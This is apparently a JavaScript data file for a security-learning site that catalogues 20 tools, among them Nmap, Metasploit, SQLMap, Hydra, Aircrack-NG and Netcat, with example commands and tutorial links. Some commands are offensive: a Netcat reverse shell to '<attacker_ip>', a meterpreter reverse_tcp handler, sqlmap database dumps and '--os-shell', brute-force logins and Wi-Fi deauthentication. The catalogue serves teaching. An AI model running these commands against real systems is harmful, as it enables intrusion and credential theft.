// tools-data.js - Enhanced Security Tools Database
// Each tool includes: real images, installation guides, YouTube tutorials, and comprehensive resources

export const securityTools = [
  {
    id: 1,
    name: "Wireshark",
    icon: "fas fa-network-wired",
    image: "images/tools/wireshark.svg",
    category: "network",
    difficulty: "beginner",
    shortDescription: "Network protocol analyzer for capturing and inspecting network traffic in real-time.",
    fullDescription: "Wireshark is the world's most popular network protocol analyzer. It lets you see what's happening on your network at a microscopic level. Used by network administrators, security professionals, and developers worldwide for troubleshooting and analysis.",
    useCases: [
      "Capture and analyze network packets in real-time",
      "Troubleshoot network connectivity issues",
      "Detect suspicious network activity and malware",
      "Learn about network protocols and how they work",
      "Verify encryption is working properly"
    ],
    commands: [
      "wireshark -i eth0",
      "wireshark -i eth0 -f 'port 80'",
      "wireshark -r capture.pcap",
      "tshark -i eth0 -w capture.pcap"
    ],
    officialLink: "https://www.wireshark.org/",
    installation: {
      windows: "Download installer from wireshark.org/download.html",
      linux: "sudo apt install wireshark",
      mac: "brew install --cask wireshark"
    },
    resources: [
      { name: "Official Documentation", url: "https://www.wireshark.org/docs/", type: "docs" },
      { name: "User Guide", url: "https://www.wireshark.org/docs/wsug_html_chunked/", type: "docs" },
      { name: "Sample Captures", url: "https://wiki.wireshark.org/SampleCaptures", type: "practice" },
      { name: "Display Filters Reference", url: "https://wiki.wireshark.org/DisplayFilters", type: "docs" }
    ],
    youtube: [
      { title: "Wireshark Tutorial for Beginners", url: "https://www.youtube.com/watch?v=TkCSr30UojM", channel: "NetworkChuck" },
      { title: "Wireshark Crash Course", url: "https://www.youtube.com/watch?v=OU-A2EmVrKQ", channel: "HackerSploit" },
      { title: "Packet Analysis with Wireshark", url: "https://www.youtube.com/watch?v=GMNOT1aZmD8", channel: "David Bombal" }
    ]
  },

  {
    id: 2,
    name: "Nmap",
    icon: "fas fa-radar",
    image: "images/tools/nmap.svg",
    category: "network",
    difficulty: "beginner",
    shortDescription: "Powerful network discovery and security auditing tool for scanning hosts and services.",
    fullDescription: "Nmap (Network Mapper) is a free, open-source utility for network discovery and security auditing. It uses raw IP packets to determine available hosts, their services, operating systems, firewall types, and other characteristics.",
    useCases: [
      "Discover hosts on a network",
      "Identify open ports and running services",
      "Detect operating systems and versions",
      "Perform vulnerability scanning with NSE scripts",
      "Map network topology"
    ],
    commands: [
      "nmap 192.168.1.1",
      "nmap -sV -sC 192.168.1.1",
      "nmap -O 192.168.1.1",
      "nmap -A -T4 192.168.1.0/24",
      "nmap --script vuln 192.168.1.1"
    ],
    officialLink: "https://nmap.org/",
    installation: {
      windows: "Download installer from nmap.org/download.html",
      linux: "sudo apt install nmap",
      mac: "brew install nmap"
    },
    resources: [
      { name: "Official Reference Guide", url: "https://nmap.org/book/man.html", type: "docs" },
      { name: "NSE Script Documentation", url: "https://nmap.org/nsedoc/", type: "docs" },
      { name: "Nmap Cheat Sheet", url: "https://www.stationx.net/nmap-cheat-sheet/", type: "cheatsheet" },
      { name: "Scanme Test Server", url: "http://scanme.nmap.org/", type: "practice" }
    ],
    youtube: [
      { title: "Nmap Tutorial for Beginners", url: "https://www.youtube.com/watch?v=4t4kBkMsDbQ", channel: "NetworkChuck" },
      { title: "Nmap Full Course", url: "https://www.youtube.com/watch?v=5MTZdN9TEO4&list=PLBf0hzazHTGM8V_3OEKhvCM9Xah3qDdIx", channel: "HackerSploit" },
      { title: "Advanced Nmap Techniques", url: "https://www.youtube.com/watch?v=lXK5j2nRuv8", channel: "Hak5" }
    ]
  },

  {
    id: 3,
    name: "Metasploit",
    icon: "fas fa-crosshairs",
    image: "images/tools/metasploit.svg",
    category: "pentesting",
    difficulty: "advanced",
    shortDescription: "World's most used penetration testing framework for exploit development and execution.",
    fullDescription: "The Metasploit Framework is a powerful platform for developing, testing, and executing exploits. It provides a comprehensive environment for penetration testing and security research with thousands of modules.",
    useCases: [
      "Penetration testing engagements",
      "Exploit development and testing",
      "Vulnerability validation",
      "Security research and training",
      "Red team operations"
    ],
    commands: [
      "msfconsole",
      "search type:exploit platform:windows",
      "use exploit/multi/handler",
      "set PAYLOAD windows/meterpreter/reverse_tcp",
      "set LHOST 192.168.1.100"
    ],
    officialLink: "https://www.metasploit.com/",
    installation: {
      windows: "Download from metasploit.com (Pro) or use Kali Linux",
      linux: "Pre-installed in Kali or install script",
      mac: "brew install metasploit"
    },
    resources: [
      { name: "Official Documentation", url: "https://docs.metasploit.com/", type: "docs" },
      { name: "Metasploit Unleashed (Free Course)", url: "https://www.offsec.com/metasploit-unleashed/", type: "course" },
      { name: "Exploit Database", url: "https://www.exploit-db.com/", type: "database" }
    ],
    youtube: [
      { title: "Metasploit for Beginners", url: "https://www.youtube.com/watch?v=8lR27r8Y_ik", channel: "HackerSploit" },
      { title: "Metasploit Full Tutorial", url: "https://www.youtube.com/watch?v=aRwxsn9ZEQw", channel: "The Cyber Mentor" },
      { title: "Meterpreter Deep Dive", url: "https://www.youtube.com/watch?v=XZh3_GIIDCA", channel: "John Hammond" }
    ]
  },

  {
    id: 4,
    name: "Burp Suite",
    icon: "fas fa-spider",
    image: "images/tools/burp-suite.svg",
    category: "web",
    difficulty: "intermediate",
    shortDescription: "Integrated platform for web application security testing and vulnerability scanning.",
    fullDescription: "Burp Suite is the leading web security testing toolkit. It provides a complete solution for web application security testing with tools for manual testing, automated scanning, and advanced analysis.",
    useCases: [
      "Web application penetration testing",
      "Intercepting and modifying HTTP requests",
      "Automated vulnerability scanning",
      "API security testing",
      "Session token analysis"
    ],
    commands: [
      "java -jar burpsuite_community.jar",
      "Configure proxy: 127.0.0.1:8080",
      "Install CA certificate",
      "Use Intercept tab",
      "Send to Repeater"
    ],
    officialLink: "https://portswigger.net/burp",
    installation: {
      windows: "Download from portswigger.net/burp/releases",
      linux: "sudo apt install burpsuite (Kali)",
      mac: "Download from portswigger.net/burp/releases"
    },
    resources: [
      { name: "Web Security Academy", url: "https://portswigger.net/web-security", type: "course" },
      { name: "Official Documentation", url: "https://portswigger.net/burp/documentation", type: "docs" },
      { name: "BApp Store", url: "https://portswigger.net/bappstore", type: "extensions" }
    ],
    youtube: [
      { title: "Burp Suite for Beginners", url: "https://www.youtube.com/watch?v=h2duGBZLEek", channel: "The Cyber Mentor" },
      { title: "Web App Testing with Burp", url: "https://www.youtube.com/watch?v=G3hpAeoZ4ek", channel: "HackerSploit" },
      { title: "Burp Suite Certified Practitioner Prep", url: "https://www.youtube.com/watch?v=o_M1j5nibWo", channel: "Rana Khalil" }
    ]
  },
    {
    id: 5,
    name: "Kali Linux",
    icon: "fas fa-dragon",
    image: "images/tools/kali-linux.svg",
    category: "pentesting",
    difficulty: "beginner",
    shortDescription: "The most popular Linux distribution for penetration testing and ethical hacking.",
    fullDescription: "Kali Linux is a Debian-based distribution designed for penetration testing, digital forensics, and red team operations. It comes with over 600 pre-installed security tools and is widely used by professionals, students, and security researchers.",
    useCases: [
      "Penetration testing and ethical hacking",
      "Digital forensics and incident response",
      "Vulnerability assessment",
      "Reverse engineering",
      "Wireless attacks and exploitation"
    ],
    commands: [
      "sudo apt update && sudo apt upgrade",
      "sudo apt install <package>",
      "ifconfig / ip a",
      "service --status-all",
      "locate <tool>"
    ],
    officialLink: "https://www.kali.org/",
    installation: {
      windows: "Use WSL2 or download VMware/VirtualBox images",
      linux: "Install via ISO or package manager",
      mac: "Use VMware Fusion or Parallels"
    },
    resources: [
      { name: "Kali Documentation", url: "https://www.kali.org/docs/", type: "docs" },
      { name: "Kali Tools List", url: "https://www.kali.org/tools/", type: "reference" },
      { name: "OffSec Training", url: "https://www.offsec.com/courses/", type: "course" }
    ],
    youtube: [
      { title: "Kali Linux Full Course", url: "https://www.youtube.com/watch?v=AnwgxRtWXLI&list=PLhfrWIlLOoKMe1Ue0IdeULQvEgCgQ3a1B", channel: "David Bombal" },
      { title: "Kali Tools Overview", url: "https://www.youtube.com/watch?v=vvp_OnKjhiky", channel: "Mr.PiwPiew" }
    ]
  },

  {
    id: 6,
    name: "John the Ripper",
    icon: "fas fa-key",
    image: "images/tools/john-the-ripper.svg",
    category: "password",
    difficulty: "intermediate",
    shortDescription: "Fast password cracking tool commonly used for auditing password strength.",
    fullDescription: "John the Ripper is one of the most popular password cracking tools in the world. It supports dictionary attacks, brute force, and highly optimized cracking modes with custom rules and formats.",
    useCases: [
      "Password auditing and recovery",
      "Hash cracking for security assessments",
      "Detecting weak password policies",
      "Testing password complexity",
      "Cracking ZIP, PDF, and system hashes"
    ],
    commands: [
      "john hash.txt",
      "john --wordlist=rockyou.txt hash.txt",
      "john --show hash.txt",
      "zip2john file.zip > hash.txt",
      "pdf2john file.pdf > hash.txt"
    ],
    officialLink: "https://www.openwall.com/john/",
    installation: {
      windows: "Use community builds",
      linux: "sudo apt install john",
      mac: "brew install john-jumbo"
    },
    resources: [
      { name: "Jumbo Documentation", url: "https://github.com/openwall/john/blob/bleeding-jumbo/doc/README", type: "docs" },
      { name: "Password Cracking Rules", url: "https://www.openwall.com/john/doc/OPTIONS.shtml", type: "docs" }
    ],
    youtube: [
      { title: "John the Ripper Tutorial", url: "https://www.youtube.com/watch?v=piNkLNqDto4", channel: "CyberSite" },
      { title: "Password Cracking Basics", url: "https://www.youtube.com/watch?v=5MLprTAxYDA", channel: "G MAN : Security" }
    ]
  },

  {
    id: 7,
    name: "Hashcat",
    icon: "fas fa-bolt",
    image: "images/tools/hashcat.svg",
    category: "password",
    difficulty: "advanced",
    shortDescription: "The world’s fastest and most advanced password recovery tool using GPU acceleration.",
    fullDescription: "Hashcat is a high-performance password cracking engine that uses CPUs, GPUs, and even distributed systems to crack password hashes. It supports more than 300 hash types including MD5, NTLM, WPA/WPA2, bcrypt, and more.",
    useCases: [
      "GPU-accelerated password cracking",
      "Large-scale corporate password audits",
      "Brute-force and hybrid attacks",
      "WPA/WPA2 Wi-Fi password cracking",
      "Hash rule-based cracking"
    ],
    commands: [
      "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
      "hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a",
      "hashcat -m 2500 file.hccapx rockyou.txt",
      "hashcat -m 1800 hash.txt wordlist.txt",
      "hashcat --restore"
    ],
    officialLink: "https://hashcat.net/hashcat/",
    installation: {
      windows: "Download from hashcat.net",
      linux: "sudo apt install hashcat",
      mac: "brew install hashcat"
    },
    resources: [
      { name: "Hashcat Wiki", url: "https://hashcat.net/wiki/", type: "docs" },
      { name: "Example Hashes", url: "https://hashcat.net/wiki/doku.php?id=example_hashes", type: "reference" },
      { name: "Mask Attack Examples", url: "https://hashcat.net/wiki/doku.php?id=mask_attack", type: "docs" }
    ],
    youtube: [
      { title: "Hashcat Full Course", url: "https://www.youtube.com/watch?v=9bC1-KJ3pOU", channel: "HackerSploit" },
      { title: "Hashcat Basics", url: "https://www.youtube.com/watch?v=ywa6ZK-MGqs", channel: "Null Byte" }
    ]
  },

  {
    id: 8,
    name: "OWASP ZAP",
    icon: "fas fa-shield-alt",
    image: "images/tools/owasp-zap.svg",
    category: "web",
    difficulty: "beginner",
    shortDescription: "Free, open-source web application vulnerability scanner from OWASP.",
    fullDescription: "OWASP ZAP (Zed Attack Proxy) is a free security tool for finding vulnerabilities in web applications. It is easy to use for beginners yet powerful for professionals, offering intercepting proxy features, automated scanning, and fuzzing.",
    useCases: [
      "Web application vulnerability scanning",
      "Intercepting and modifying web traffic",
      "Testing authentication flows",
      "Fuzzing parameters and APIs",
      "Finding XSS, SQLi, CSRF, IDOR, and more"
    ],
    commands: [
      "zap.sh",
      "zap.sh -daemon",
      "zap-cli quick-scan --self-contained http://example.com",
      "zap-cli report -o report.html -f html",
      "zap-cli alerts"
    ],
    officialLink: "https://www.zaproxy.org/",
    installation: {
      windows: "Download from zaproxy.org/download/",
      linux: "sudo apt install zaproxy",
      mac: "brew install zaproxy"
    },
    resources: [
      { name: "ZAP Documentation", url: "https://www.zaproxy.org/docs/", type: "docs" },
      { name: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", type: "docs" },
      { name: "ZAP Add-ons", url: "https://www.zaproxy.org/addons/", type: "extensions" }
    ],
    youtube: [
      { title: "OWASP ZAP Beginner Tutorial", url: "https://www.youtube.com/watch?v=ub5cYJ5M8DM", channel: "Hari Sekhon" },
      { title: "ZAP for Web Pentesting", url: "https://www.youtube.com/watch?v=lFD8FxM5nj8", channel: "HackerSploit" }
    ]
  },
    {
    id: 9,
    name: "Nikto",
    icon: "fas fa-search",
    image: "images/tools/nikto.svg",
    category: "web",
    difficulty: "beginner",
    shortDescription: "Web server scanner that detects dangerous files, outdated software, and security misconfigurations.",
    fullDescription: "Nikto is an open-source web server scanner that performs comprehensive tests against web servers. It identifies outdated software, potential vulnerabilities, insecure files, and misconfigurations.",
    useCases: [
      "Scan web servers for vulnerabilities",
      "Identify outdated server software",
      "Detect dangerous files and directories",
      "Check for server misconfigurations"
    ],
    commands: [
      "nikto -h http://target.com",
      "nikto -h https://example.com -ssl",
      "nikto -list-plugins",
      "nikto -h http://target.com -output report.html"
    ],
    officialLink: "https://cirt.net/Nikto2",
    installation: {
      windows: "Use Kali VM or GitHub source",
      linux: "sudo apt install nikto",
      mac: "brew install nikto"
    },
    resources: [
      { name: "Official GitHub", url: "https://github.com/sullo/nikto", type: "code" },
      { name: "Nikto Docs", url: "https://cirt.net/Nikto2", type: "docs" }
    ],
    youtube: [
      { title: "Nikto Web Scanner Tutorial", url: "https://www.youtube.com/watch?v=cnf86FsmHv4", channel: "HackerSploit" }
    ]
  },

  {
    id: 10,
    name: "SQLMap",
    icon: "fas fa-database",
    image: "images/tools/sqlmap.svg",
    category: "web",
    difficulty: "intermediate",
    shortDescription: "Fully automated SQL injection tool used to detect and exploit database vulnerabilities.",
    fullDescription: "SQLMap is a powerful penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It supports multiple databases, advanced payloads, database takeover, and file system access.",
    useCases: [
      "Detect SQL injection vulnerabilities",
      "Enumerate database contents",
      "Dump tables and credentials",
      "Take over database servers",
      "Bypass login forms"
    ],
    commands: [
      "sqlmap -u 'http://site.com/index.php?id=1'",
      "sqlmap -u URL --dbs",
      "sqlmap -u URL -D dbname --tables",
      "sqlmap -u URL -D dbname -T users --dump",
      "sqlmap -u URL --os-shell"
    ],
    officialLink: "https://sqlmap.org/",
    installation: {
      windows: "Download ZIP from sqlmap.org",
      linux: "sudo apt install sqlmap",
      mac: "brew install sqlmap"
    },
    resources: [
      { name: "Official Wiki", url: "https://github.com/sqlmapproject/sqlmap/wiki", type: "docs" },
      { name: "Payloads Examples", url: "https://book.hacktricks.xyz/pentesting-web/sql-injection", type: "reference" }
    ],
    youtube: [
      { title: "SQLMap for Beginners", url: "https://www.youtube.com/watch?v=EomTqZqIaL4", channel: "HackerSploit" },
      { title: "SQL Injection with SQLMap", url: "https://www.youtube.com/watch?v=Y7pQ7d1PRk8", channel: "The Cyber Mentor" }
    ]
  },

  {
    id: 11,
    name: "Aircrack-NG",
    icon: "fas fa-wifi",
    image: "images/tools/aircrack-ng.svg",
    category: "wireless",
    difficulty: "advanced",
    shortDescription: "Wireless penetration testing suite for cracking WEP/WPA/WPA2 keys.",
    fullDescription: "Aircrack-NG is a complete suite of Wi-Fi security tools used for monitoring, attacking, testing, and cracking wireless networks. It supports packet capture, deauthentication attacks, and password recovery for WPA/WPA2.",
    useCases: [
      "Capture WPA/WPA2 handshakes",
      "Perform deauthentication attacks",
      "Crack Wi-Fi passwords",
      "Monitor wireless traffic",
      "Test wireless network security"
    ],
    commands: [
      "airmon-ng start wlan0",
      "airodump-ng wlan0mon",
      "aireplay-ng -0 5 -a <BSSID> wlan0mon",
      "aircrack-ng capture.cap",
      "airodump-ng --bssid <BSSID> -c <channel> -w output wlan0mon"
    ],
    officialLink: "https://www.aircrack-ng.org/",
    installation: {
      windows: "Download from aircrack-ng.org",
      linux: "sudo apt install aircrack-ng",
      mac: "brew install aircrack-ng"
    },
    resources: [
      { name: "Official Documentation", url: "https://www.aircrack-ng.org/doku.php?id=documentation", type: "docs" },
      { name: "Wireless Attacks Guide", url: "https://book.hacktricks.xyz/wifi", type: "reference" }
    ],
    youtube: [
      { title: "Wi-Fi Hacking Basics", url: "https://www.youtube.com/watch?v=o3g1AXQoEHE", channel: "Cyb3rMaddy" },
      { title: "Aircrack Tutorial", url: "https://www.youtube.com/watch?v=uKZb3D-PHS0", channel: "Hak5" }
    ]
  },

  {
    id: 12,
    name: "Hydra",
    icon: "fas fa-unlock-alt",
    image: "images/tools/hydra.svg",
    category: "password",
    difficulty: "intermediate",
    shortDescription: "High-speed online password cracking tool supporting numerous network protocols.",
    fullDescription: "Hydra is a fast and flexible network login cracker that supports numerous protocols including FTP, SSH, SMB, HTTP, RDP, and more. It is commonly used during penetration testing to test password strength for network services.",
    useCases: [
      "Brute-force SSH, FTP, RDP, and HTTP logins",
      "Password auditing for network services",
      "Testing weak or default credentials",
      "Red team credential testing"
    ],
    commands: [
      "hydra -l admin -P rockyou.txt ftp://192.168.1.10",
      "hydra -L users.txt -P passwords.txt ssh://192.168.1.5",
      "hydra -l admin -P passlist.txt -s 3389 rdp://10.0.0.5",
      "hydra -l user -P list.txt http-post-form \"/login:usr=^USER^&pwd=^PASS^:F=incorrect\""
    ],
    officialLink: "https://github.com/vanhauser-thc/thc-hydra",
    installation: {
      windows: "Use Kali Linux or compile from source",
      linux: "sudo apt install hydra",
      mac: "brew install hydra"
    },
    resources: [
      { name: "Hydra GitHub", url: "https://github.com/vanhauser-thc/thc-hydra", type: "code" },
      { name: "Hydra Wiki", url: "https://github.com/vanhauser-thc/thc-hydra/wiki", type: "docs" }
    ],
    youtube: [
      { title: "Hydra Password Cracking Tutorial", url: "https://www.youtube.com/watch?v=u3vCw0A_4Uw", channel: "HackerSploit" },
      { title: "Hydra SSH Attack Demo", url: "https://www.youtube.com/watch?v=O1npsaAGZJg", channel: "Null Byte" }
    ]
  },
    {
    id: 13,
    name: "Maltego",
    icon: "fas fa-project-diagram",
    image: "images/tools/maltego.svg",
    category: "osint",
    difficulty: "intermediate",
    shortDescription: "Powerful OSINT and link analysis tool used for data mining and visualizing relationships.",
    fullDescription: "Maltego is a leading OSINT platform used by security analysts, investigators, and intelligence teams. It maps relationships between people, domains, IPs, organizations, social media accounts, and more using graph-based intelligence.",
    useCases: [
      "Digital investigations and intelligence gathering",
      "Mapping relationships between entities",
      "Tracking threat actors",
      "OSINT reconnaissance for pentesting",
      "Fraud and crime investigations"
    ],
    commands: [
      "maltego",
      "Use Transform Hub",
      "Run DNS, WHOIS, and email transforms",
      "Export graph results"
    ],
    officialLink: "https://www.maltego.com/",
    installation: {
      windows: "Download from maltego.com",
      linux: "sudo dpkg -i maltego.deb",
      mac: "Download .dmg from maltego.com"
    },
    resources: [
      { name: "Maltego Docs", url: "https://docs.maltego.com/", type: "docs" },
      { name: "Transform Hub", url: "https://www.maltego.com/transform-hub/", type: "reference" }
    ],
    youtube: [
      { title: "Maltego Tutorial for OSINT", url: "https://www.youtube.com/watch?v=4N2M3W8j6VM", channel: "HackerSploit" },
      { title: "Maltego Investigations", url: "https://www.youtube.com/watch?v=kO6-hwxKFkc", channel: "SecurityFWD" }
    ]
  },

  {
    id: 14,
    name: "theHarvester",
    icon: "fas fa-search-location",
    image: "images/tools/theharvester.svg",
    category: "osint",
    difficulty: "beginner",
    shortDescription: "OSINT tool for gathering emails, domain information, and public data from multiple sources.",
    fullDescription: "theHarvester is an OSINT reconnaissance tool used to gather publicly available information from search engines, social networks, DNS records, and more. It is commonly used during the recon phase of penetration tests.",
    useCases: [
      "Gather emails and usernames",
      "Collect DNS information",
      "Enumerate subdomains",
      "Find employee names and profiles",
      "OSINT footprinting"
    ],
    commands: [
      "theHarvester -d domain.com -b google",
      "theHarvester -d domain.com -b bing",
      "theHarvester -d domain.com -b linkedin",
      "theHarvester -d domain.com -b all"
    ],
    officialLink: "https://github.com/laramies/theHarvester",
    installation: {
      windows: "Use Kali VM",
      linux: "sudo apt install theharvester",
      mac: "brew install theharvester"
    },
    resources: [
      { name: "GitHub Repository", url: "https://github.com/laramies/theHarvester", type: "code" },
      { name: "OSINT Framework", url: "https://osintframework.com/", type: "reference" }
    ],
    youtube: [
      { title: "theHarvester Tutorial", url: "https://www.youtube.com/watch?v=sM5T-fjGJUE", channel: "HackerSploit" }
    ]
  },

  {
    id: 15,
    name: "Shodan",
    icon: "fas fa-globe",
    image: "images/tools/shodan.webp",
    category: "osint",
    difficulty: "beginner",
    shortDescription: "Search engine for internet-connected devices, servers, and exposed services.",
    fullDescription: "Shodan is a unique search engine that indexes internet-connected devices such as routers, webcams, ICS/SCADA systems, servers, and more. It is widely used by cybersecurity professionals for discovering exposed assets.",
    useCases: [
      "Find exposed devices on the internet",
      "Discover misconfigured servers",
      "Identify vulnerable IoT devices",
      "Track attack surfaces",
      "Search industrial control systems (ICS)"
    ],
    commands: [
      "shodan search apache",
      "shodan search 'port:22'",
      "shodan host <IP>",
      "shodan stats --facets country apache"
    ],
    officialLink: "https://www.shodan.io/",
    installation: {
      windows: "pip install shodan",
      linux: "pip install shodan",
      mac: "pip install shodan"
    },
    resources: [
      { name: "Shodan CLI Docs", url: "https://cli.shodan.io/", type: "docs" },
      { name: "Search Filters", url: "https://www.shodan.io/search/filters", type: "reference" }
    ],
    youtube: [
      { title: "Shodan OSINT Tutorial", url: "https://www.youtube.com/watch?v=Jo6JXkpW_L8", channel: "NetworkChuck" },
      { title: "Finding Vulnerable Devices", url: "https://www.youtube.com/watch?v=_IhNPIxvC3M", channel: "HackerSploit" }
    ]
  },

  {
    id: 16,
    name: "Autopsy",
    icon: "fas fa-microscope",
    image: "images/tools/autopsy.svg",
    category: "forensics",
    difficulty: "beginner",
    shortDescription: "Digital forensics platform for analyzing disks, files, timelines, and artifacts.",
    fullDescription: "Autopsy is an open-source digital forensics platform used by investigators, DFIR teams, and law enforcement. It provides tools for analyzing file systems, recovering deleted files, creating timelines, and identifying artifacts.",
    useCases: [
      "Digital forensic investigations",
      "File recovery and timeline analysis",
      "Finding user activity artifacts",
      "Analyzing disk images",
      "Incident response investigations"
    ],
    commands: [
      "autopsy",
      "Load disk image",
      "Run ingest modules",
      "Review artifacts",
      "Generate investigation report"
    ],
    officialLink: "https://www.autopsy.com/",
    installation: {
      windows: "Download installer from autopsy.com",
      linux: "Use Sleuth Kit tools or compile from source",
      mac: "Use VM — no native macOS support"
    },
    resources: [
      { name: "Autopsy User Guide", url: "https://sleuthkit.org/autopsy/docs/user-guide/", type: "docs" },
      { name: "DFIR Training", url: "https://www.dfirdomain.com/", type: "course" }
    ],
    youtube: [
      { title: "Autopsy Forensics Tutorial", url: "https://www.youtube.com/watch?v=nO7L4aNGmQc", channel: "HackerSploit" },
      { title: "Digital Forensics Basics", url: "https://www.youtube.com/watch?v=cRZI2yLx8CI", channel: "DFIRScience" }
    ]
  },
    {
    id: 17,
    name: "Volatility",
    icon: "fas fa-memory",
    image: "images/tools/volatility.png",
    category: "forensics",
    difficulty: "advanced",
    shortDescription: "Memory forensics framework for analyzing RAM dumps and investigating malware.",
    fullDescription: "Volatility is the most widely used memory forensics framework for incident response and malware analysis. It extracts hundreds of artifacts from RAM images such as processes, network connections, DLLs, registry hives, and malware remnants.",
    useCases: [
      "Analyze RAM dumps",
      "Investigate malware activity",
      "Recover encryption keys",
      "Identify malicious processes",
      "Forensic timeline reconstruction"
    ],
    commands: [
      "volatility -f memory.img windows.pslist",
      "volatility -f memory.img windows.netstat",
      "volatility -f memory.img windows.dlllist",
      "volatility -f memory.img windows.cmdline",
      "volatility -f memory.img windows.malfind"
    ],
    officialLink: "https://www.volatilityfoundation.org/",
    installation: {
      windows: "pip install volatility3",
      linux: "pip install volatility3",
      mac: "pip install volatility3"
    },
    resources: [
      { name: "Volatility Docs", url: "https://volatility3.readthedocs.io/", type: "docs" },
      { name: "Memory Forensics Guide", url: "https://www.memoryanalysis.net/", type: "reference" }
    ],
    youtube: [
      { title: "Volatility Forensics Tutorial", url: "https://www.youtube.com/watch?v=mE3GqBz4vFE", channel: "HackerSploit" },
      { title: "Memory Forensics 101", url: "https://www.youtube.com/watch?v=_zGqGJxmUoY", channel: "DFIRScience" }
    ]
  },

  {
    id: 18,
    name: "Gobuster",
    icon: "fas fa-folder-open",
    image: "images/tools/gobuster.svg",
    category: "web",
    difficulty: "intermediate",
    shortDescription: "Directory, file, and DNS brute-forcing tool used in web penetration testing.",
    fullDescription: "Gobuster is a fast and lightweight tool written in Go used for brute-forcing URIs, DNS subdomains, and virtual hosts. It is widely used during web penetration tests to find hidden files and directories.",
    useCases: [
      "Brute-force hidden directories",
      "Discover unlinked files",
      "Enumerate DNS subdomains",
      "Find virtual hosts"
    ],
    commands: [
      "gobuster dir -u http://site.com -w wordlist.txt",
      "gobuster dns -d domain.com -w subdomains.txt",
      "gobuster vhost -u http://host -w vhosts.txt",
      "gobuster dir -x php,html -u http://site.com -w wordlist.txt"
    ],
    officialLink: "https://github.com/OJ/gobuster",
    installation: {
      windows: "Download compiled binary from GitHub",
      linux: "sudo apt install gobuster",
      mac: "brew install gobuster"
    },
    resources: [
      { name: "Gobuster GitHub", url: "https://github.com/OJ/gobuster", type: "code" },
      { name: "Wordlists", url: "https://github.com/danielmiessler/SecLists", type: "reference" }
    ],
    youtube: [
      { title: "Gobuster Tutorial", url: "https://www.youtube.com/watch?v=wbU8sf8Yb34", channel: "HackerSploit" },
      { title: "Finding Hidden Directories", url: "https://www.youtube.com/watch?v=7A6j_5p2NFE", channel: "The Cyber Mentor" }
    ]
  },

  {
    id: 19,
    name: "Responder",
    icon: "fas fa-network-wired",
    image: "images/tools/responder.svg",
    category: "network",
    difficulty: "intermediate",
    shortDescription: "LLMNR, NBT-NS, and MDNS poisoning tool for capturing NTLM hashes on local networks.",
    fullDescription: "Responder is a powerful tool for network poisoning attacks. It listens on a LAN for name resolution requests and responds to them, capturing NTLMv2 hashes for offline cracking or authentication relays.",
    useCases: [
      "Capture NTLM hashes",
      "Perform LLMNR, NBT-NS, MDNS poisoning",
      "Internal network reconnaissance",
      "Relay authentication attacks",
      "Password audit engagements"
    ],
    commands: [
      "responder -I eth0",
      "responder -I wlan0 -wrf",
      "responder -I eth0 -v",
      "python Responder.py -I eth0"
    ],
    officialLink: "https://github.com/lgandx/Responder",
    installation: {
      windows: "Use Kali VM or WSL",
      linux: "Pre-installed on Kali",
      mac: "Use VM — Linux recommended"
    },
    resources: [
      { name: "GitHub Repository", url: "https://github.com/lgandx/Responder", type: "code" },
      { name: "Responder Tutorial", url: "https://hackersinterview.com/responder-llmnr-ntlm/", type: "docs" }
    ],
    youtube: [
      { title: "Responder Hash Capture Demo", url: "https://www.youtube.com/watch?v=Yt9UdnYt7uM", channel: "HackerSploit" },
      { title: "LLMNR Poisoning Explained", url: "https://www.youtube.com/watch?v=4XjBebpChG0", channel: "The Cyber Mentor" }
    ]
  },

  {
    id: 20,
    name: "Netcat",
    icon: "fas fa-terminal",
    image: "images/tools/netcat.svg",
    category: "network",
    difficulty: "beginner",
    shortDescription: "Swiss army knife of networking — used for reading, writing, and redirecting network connections.",
    fullDescription: "Netcat (nc) is a flexible networking utility used to create TCP/UDP connections, transfer files, open backdoors, scan ports, and debug network services. It is widely used in penetration testing and system administration.",
    useCases: [
      "Create reverse and bind shells",
      "Transfer files over TCP/UDP",
      "Simple port scanning",
      "Banner grabbing",
      "Debug and test network services"
    ],
    commands: [
      "nc -lvnp 4444",
      "nc <attacker_ip> 4444 -e /bin/bash",
      "nc -zv 192.168.1.1 1-1000",
      "nc -q 0 192.168.1.5 5555 < file.txt",
      "nc -l 1234 > file.txt"
    ],
    officialLink: "https://nc110.sourceforge.io/",
    installation: {
      windows: "Use Ncat from Nmap",
      linux: "sudo apt install netcat",
      mac: "brew install netcat"
    },
    resources: [
      { name: "Netcat Cheat Sheet", url: "https://highon.coffee/blog/netcat-cheat-sheet/", type: "cheatsheet" },
      { name: "Ncat Docs", url: "https://nmap.org/ncat/guide/index.html", type: "docs" }
    ],
    youtube: [
      { title: "Netcat Full Tutorial", url: "https://www.youtube.com/watch?v=ZuRPl6B8M8M", channel: "HackerSploit" },
      { title: "Reverse Shells with Netcat", url: "https://www.youtube.com/watch?v=I4E78DU0Sjk", channel: "Null Byte" }
    ]
  }
];


// Helper function to get tools by category
export function getToolsByCategory(category) {
  if (category === 'all') return securityTools;
  return securityTools.filter(tool => tool.category === category);
}

// Helper function to get tools by difficulty
export function getToolsByDifficulty(difficulty) {
  if (difficulty === 'all') return securityTools;
  return securityTools.filter(tool => tool.difficulty === difficulty);
}

// Helper function to search tools
export function searchTools(query) {
  const lowerQuery = query.toLowerCase();
  return securityTools.filter(tool => 
    tool.name.toLowerCase().includes(lowerQuery) ||
    tool.shortDescription.toLowerCase().includes(lowerQuery) ||
    tool.category.toLowerCase().includes(lowerQuery)
  );
}

// Helper function to get tool by ID
export function getToolById(id) {
  return securityTools.find(tool => tool.id === id);
}
